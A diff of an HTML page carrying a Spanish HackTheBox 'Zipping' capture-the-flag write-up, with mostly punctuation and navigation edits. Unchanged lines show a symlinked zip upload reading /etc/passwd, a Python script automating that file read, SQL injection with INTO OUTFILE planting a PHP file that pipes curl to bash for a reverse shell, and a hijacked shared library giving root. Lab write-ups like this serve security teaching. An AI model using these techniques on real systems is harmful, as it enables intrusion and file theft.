@@ -5,47 +5,19 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Writeup Zipping</title>
  <link rel="stylesheet" href="/assets/css/styles_machine.css" />
+ <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
+ <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">    
 </head>
 <body>
-  <div class="menu">
-    <div id="mySidepanel" class="sidepanel">
-        <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">×</a>
-        <a href="/htb">HackTheBox</a>
-        <a href="/">Home</a>
-        <a href="https://mrpr1ngl3s.github.io/blog">Blog</a>
-    </div>
-    
-    <button class="openbtn" onclick="openNav()">☰</button>  
-</div>
-<script>
-function openNav() {
-if (window.innerWidth <= 1000) {
-    document.getElementById("mySidepanel").style.display = "block";
-} else {
-    document.getElementById("mySidepanel").style.width = "25%";
-}
-}
-
-function closeNav() {
-if (window.innerWidth <= 1000) {
-    document.getElementById("mySidepanel").style.display = "none";
-} else {
-    document.getElementById("mySidepanel").style.width = "0";
-}
-
-}
-
-</script>
-
   <div class="main">
 <a href="https://app.hackthebox.com/machines/Zipping/"  target="_blank"><img style="float: right; margin-left:60px; height:90px;" src="/img/Zipping.png"/></a>
 
 <h1 id="zipping">Zipping</h1>
 <h2 id="enumeración">Enumeración</h2>
-<p>Iniciamos con la máquina comprobando la conectividad realizando un <strong>ping</strong> a la IP <strong>10.10.11.229</strong> .</p>
+<p>Iniciamos con la máquina comprobando la conectividad realizando un <strong>ping</strong> a la IP <strong>10.10.11.229</strong>.</p>
 <div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a>❯ <span class="fu">ping</span> -c 1 10.10.11.229</span>
 <span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a><span class="ex">PING</span> 10.10.11.229 (10.10.11.229) <span class="ex">56</span>(84) <span class="ex">bytes</span> of data.</span>
 <span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a><span class="ex">64</span> bytes from 10.10.11.229: icmp_seq=1 ttl=63 time=52.7 ms</span>
@@ -172,7 +144,7 @@ if (window.innerWidth <= 1000) {
 <img src="Img/Pasted image 20240427093530.png">
 <p>Al acceder vemos que podemos subir un archivos <strong>.zip</strong> los cuales deben contener un archivo <strong>.pdf</strong>.</p>
 <img src="Img/Pasted image 20240427093606.png">
-<p>Si tratamos de crear el .zip con un archivo PHP y lo interceptamos con <strong>BurpSuite</strong> para tratar de ver si podemos tratar de subir el archivo .</p>
+<p>Si tratamos de crear el .zip con un archivo PHP y lo interceptamos con <strong>BurpSuite</strong> para ver si podemos tratar de subir el archivo.</p>
 <img src="Img/Pasted image 20240428091944.png">
 <img src="Img/Pasted image 20240428092108.png">
 <img src="Img/Pasted image 20240428092233.png">
@@ -259,8 +231,8 @@ if (window.innerWidth <= 1000) {
 <img src="Img/Pasted image 20240427140923.png">
 <p>Si tratamos de ver el código fuente del archivo no nos funciona.</p>
 <img src="Img/Pasted image 20240427164224.png">
-<p>Ya que podemos agregar un archivo al sistema y acceder a este, podríamos tratar de crear un enlace simbólico hacia la ruta <strong>/product.php</strong> .</p>
-<p>Para realizar una prueba, intentaremos ver el contenido de <strong>/etc/passwd</strong> utilizando el comando <strong>ln</strong> .</p>
+<p>Ya que podemos agregar un archivo al sistema y acceder a este, podríamos tratar de crear un enlace simbólico hacia la ruta <strong>/product.php</strong>.</p>
+<p>Para realizar una prueba, intentaremos ver el contenido de <strong>/etc/passwd</strong> utilizando el comando <strong>ln</strong>.</p>
 <div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a>❯ <span class="fu">ln</span> -s /etc/passwd shell.pdf</span></code></pre></div>
 <table>
 <thead>
@@ -276,7 +248,7 @@ if (window.innerWidth <= 1000) {
 </tr>
 </tbody>
 </table>
-<p>Teniendo ya el archivo PDF creado con su enlace simbólico, procedemos a crear el archivo ZIP .</p>
+<p>Teniendo ya el archivo PDF creado con su enlace simbólico, procedemos a crear el archivo ZIP.</p>
 <div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a>❯ <span class="fu">zip</span> --symlinks shell.zip shell.pdf</span>
 <span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a>  <span class="ex">adding</span>: shell.pdf (stored 0%)</span></code></pre></div>
 <table>
@@ -295,7 +267,7 @@ if (window.innerWidth <= 1000) {
 </table>
 <p>Si subimos el archivo y accedemos no vemos nada.</p>
 <img src="Img/Pasted image 20240427171142.png">
-<p>Pero si utilizamos <strong>curl</strong> para ver el codigo fuente, vemos el contenido del archivo <strong>/etc/passwd</strong> .</p>
+<p>Pero si utilizamos <strong>curl</strong> para ver el codigo fuente, vemos el contenido del archivo <strong>/etc/passwd</strong>.</p>
 <div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a>❯ <span class="ex">curl</span> -s -X GET <span class="st">&quot;http://10.10.11.229/uploads/d2449f87bdf334c6189f5f5bc0b40083/shell.pdf&quot;</span></span></code></pre></div>
 <table>
 <colgroup>
@@ -422,7 +394,7 @@ if (window.innerWidth <= 1000) {
 <span id="cb12-4"><a href="#cb12-4" aria-hidden="true"></a>     <span class="cf">return</span> parser.parse_args()</span>
 <span id="cb12-5"><a href="#cb12-5" aria-hidden="true"></a></span>
 <span id="cb12-6"><a href="#cb12-6" aria-hidden="true"></a>arg <span class="op">=</span> arguments()</span></code></pre></div>
-<p>Con el valor ya obtenido, lo envía a la función <strong>makeRequest</strong> .</p>
+<p>Con el valor ya obtenido, lo envía a la función <strong>makeRequest</strong>.</p>
 <div class="sourceCode" id="cb13"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true"></a>makeRequest(arg.<span class="bu">file</span>)</span></code></pre></div>
 <p>Lo primero que hace la función es eliminar en caso de que existan, el archivo PDF y el ZIP.</p>
 <div class="sourceCode" id="cb14"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true"></a>url <span class="op">=</span> <span class="st">&quot;http://10.10.11.229&quot;</span>  </span>
@@ -432,7 +404,7 @@ if (window.innerWidth <= 1000) {
 <span id="cb14-5"><a href="#cb14-5" aria-hidden="true"></a>  </span>
 <span id="cb14-6"><a href="#cb14-6" aria-hidden="true"></a>    <span class="cf">if</span> os.path.exists(<span class="st">&quot;passwd.zip&quot;</span>):  </span>
 <span id="cb14-7"><a href="#cb14-7" aria-hidden="true"></a>        os.remove(<span class="st">&quot;shell.zip&quot;</span>)</span></code></pre></div>
-<p>Después de eliminar los archivos, crea primero el archivo PDF con el enlace simbólico que es recibido por el parámetro, para luego crear el archivo ZIP enviando el stdout (1) al “/dev/null” para que no se muestre el output del comando zip.</p>
+<p>Después de eliminar los archivos, crea primero el archivo PDF con el enlace simbólico que es recibido por el parámetro, para luego crear el archivo ZIP enviando el <strong>stdout</strong> al <strong>/dev/null</strong> para que no se muestre el output del comando zip.</p>
 <div class="sourceCode" id="cb15"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true"></a> <span class="bu">print</span>(<span class="st">&quot;Creando enlace simbolico...&quot;</span>)</span>
 <span id="cb15-2"><a href="#cb15-2" aria-hidden="true"></a> time.sleep(<span class="dv">1</span>)</span>
 <span id="cb15-3"><a href="#cb15-3" aria-hidden="true"></a> os.system(<span class="ss">f&quot;ln -s </span><span class="sc">{</span><span class="bu">file</span><span class="sc">}</span><span class="ss"> shell.pdf&quot;</span>)</span>
@@ -449,7 +421,7 @@ if (window.innerWidth <= 1000) {
 <span id="cb16-6"><a href="#cb16-6" aria-hidden="true"></a>        s <span class="op">=</span> requests.Session()  </span></code></pre></div>
 <p>Y en la misma sesión envía el archivo ZIP.</p>
 <div class="sourceCode" id="cb17"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true"></a>        r <span class="op">=</span> s.post(<span class="ss">f&quot;</span><span class="sc">{</span>url<span class="sc">}</span><span class="ss">/upload.php&quot;</span>, files<span class="op">=</span>file_zip)  </span></code></pre></div>
-<p>Para terminar, con la librería “BeautifulSoup” extrae el contenido HTML, el cual consigue el nombre del UUID, para luego realizar una ultima solicitud vía GET e imprimir el contenido.</p>
+<p>Para terminar, con la librería <strong>BeautifulSoup</strong> extrae el contenido HTML, el cual consigue el nombre del UUID, para luego realizar una ultima solicitud vía GET e imprimir el contenido.</p>
 <div class="sourceCode" id="cb18"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true"></a>        soup <span class="op">=</span> BeautifulSoup(r.text, <span class="st">&#39;html.parser&#39;</span>)  </span>
 <span id="cb18-2"><a href="#cb18-2" aria-hidden="true"></a>  </span>
 <span id="cb18-3"><a href="#cb18-3" aria-hidden="true"></a>        enlaces <span class="op">=</span> soup.find_all(<span class="st">&#39;a&#39;</span>)  </span>
@@ -466,7 +438,7 @@ if (window.innerWidth <= 1000) {
 <span id="cb18-14"><a href="#cb18-14" aria-hidden="true"></a>        <span class="bu">print</span>(r.text)</span></code></pre></div>
 <p>Al ejecutar el script podemos ver los archivos del sistema.</p>
 <img src="Img/Pasted image 20240427174717.png">
-<p>Suponiendo que la pagina se encuentra en la ruta <strong>/var/www/html</strong> tratamos de ver ahora el contenido del <strong>product.php</strong> .</p>
+<p>Suponiendo que la pagina se encuentra en la ruta <strong>/var/www/html</strong> tratamos de ver ahora el contenido del <strong>product.php</strong>.</p>
 <img src="Img/Pasted image 20240427175045.png">
 <p>Vemos que hay un texto que pone que la consulta es inyectable.</p>
 <img src="Img/Pasted image 20240427180344.png">
@@ -478,7 +450,7 @@ if (window.innerWidth <= 1000) {
 <p>Buscando por internet vemos que una forma de bypassear el <strong>preg_match</strong> es realizando un salto de línea.</p>
 <img src="Img/Pasted image 20240428093326.png">
 <img src="Img/Pasted image 20240428095326.png">
-<p>Para cerrar la query y poner otra utilizaremos el punto y coma <strong>;</strong> .</p>
+<p>Para cerrar la query y poner otra utilizaremos el punto y coma <strong>;</strong>.</p>
 <img src="Img/Pasted image 20240428105854.png">
 <p>Pero vemos que no nos funciona.</p>
 <img src="Img/Pasted image 20240428105937.png">
@@ -487,15 +459,14 @@ if (window.innerWidth <= 1000) {
 <img src="Img/Pasted image 20240428110242.png">
 <p>Al ponerlo ya si que nos realiza los 5 segundos de espera.</p>
 <img src="Img/Pasted image 20240428110325.png">
-<p>Viendo otros archivos del sistema vemos que en el <strong>/shop/index.php</strong> esta accediendo a recursos del sistema mediante el parámetro <strong>page</strong> pero además esta añadiendo a la fuerza la extensión <strong>.php</strong> .</p>
+<p>Viendo otros archivos del sistema vemos que en el <strong>/shop/index.php</strong> esta accediendo a recursos del sistema mediante el parámetro <strong>page</strong> pero además esta añadiendo a la fuerza la extensión <strong>.php</strong>.</p>
 <img src="Img/Pasted image 20240428110448.png">
 <p>Con <strong>into outfile</strong> podemos crear archivos con contenido en la inyección SQL.</p>
-<p>Para hacer un ejemplo vamos ha crear el archivo <strong>test.txt</strong> en la ruta <strong>/tmp</strong> .</p>
+<p>Para hacer un ejemplo vamos ha crear el archivo <strong>test.txt</strong> en la ruta <strong>/tmp</strong>.</p>
 <img src="Img/Pasted image 20240428113709.png">
 <p>Pero vemos que no tenemos acceso.</p>
 <img src="Img/Pasted image 20240428113737.png">
-<p>Las consultas que se realizan, seguramente sean del usuario mysql, por tanto una de las rutas que utiliza mysql es <strong>/var/lib/mysql</strong> .</p>
-<p>Tratando de añadir un archivo a esa ruta vemos que nos funciona.</p>
+<p>El <strong>RDBMS</strong> en uso será <strong>MariaDB</strong>, y una de sus rutas de almacenamiento es <strong>/var/lib/mysql</strong>. Al intentar añadir un archivo a esa ruta, vemos que sí funciona.</p>
 <img src="Img/Pasted image 20240428114551.png">
 <img src="Img/Pasted image 20240428114606.png">
 <p>Ahora teniendo la capacidad de poder crear archivos con <strong>into outfile</strong> y acceder a ellos con el parámetro <strong>?page</strong> vamos a tratar de crear un archivo <strong>.php</strong> el cual nos envié una ReverseShell.</p>
@@ -507,7 +478,7 @@ if (window.innerWidth <= 1000) {
 <p>Para la creación del archivo PHP, para que no de problemas el tema del URL vamos a urlencodearlo todo, y en la parte de la petición con curl, para que luego nos ejecute el output, vamos a utilizar el pipe <strong>|</strong> seguido del comando <strong>bash</strong> para que sea ejecutado.</p>
 <img src="Img/Pasted image 20240428123301.png">
 <img src="Img/Pasted image 20240428123333.png">
-<p>Con el archivo ya creado nos ponemos en escucha por el puerto <strong>443</strong> con <strong>netcat</strong> .</p>
+<p>Con el archivo ya creado nos ponemos en escucha por el puerto <strong>443</strong> con <strong>netcat</strong>.</p>
 <div class="sourceCode" id="cb19"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true"></a>❯ <span class="ex">nc</span> -lvnp 443</span>
 <span id="cb19-2"><a href="#cb19-2" aria-hidden="true"></a><span class="ex">listening</span> on [any] 443 ...</span></code></pre></div>
 <table>
@@ -603,12 +574,12 @@ if (window.innerWidth <= 1000) {
 </tr>
 </tbody>
 </table>
-<p>Y lo metemos al directorio <strong>.config</strong> .</p>
+<p>Y lo metemos al directorio <strong>.config</strong>.</p>
 <div class="sourceCode" id="cb24"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true"></a><span class="ex">rektsu@zipping</span>:/home/rektsu$ mv libcounter.so .config/</span>
 <span id="cb24-2"><a href="#cb24-2" aria-hidden="true"></a><span class="ex">rektsu@zipping</span>:/home/rektsu$ ls .config/</span>
 <span id="cb24-3"><a href="#cb24-3" aria-hidden="true"></a><span class="ex">libcounter.so</span></span>
 <span id="cb24-4"><a href="#cb24-4" aria-hidden="true"></a><span class="ex">rektsu@zipping</span>:/home/rektsu$ </span></code></pre></div>
-<p>Al ejecutar el binario de nuevo y meter la contraseña, ya recibimos la shell como el usuario <strong>root</strong> .</p>
+<p>Al ejecutar el binario de nuevo y meter la contraseña, ya recibimos la shell como el usuario <strong>root</strong>.</p>
 <img src="Img/Pasted image 20240428145109.png">
 <p>Y ya finalmente podemos visualizar la ultima flag.</p>
 <div class="sourceCode" id="cb25"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true"></a><span class="ex">root@zipping</span>:/home/rektsu# cd /root</span>
@@ -623,5 +594,8 @@ if (window.innerWidth <= 1000) {
 
 
   </div>
+
+<script src="/assets/js/Nav.js" defer></script>
+
 </body>
 </html>
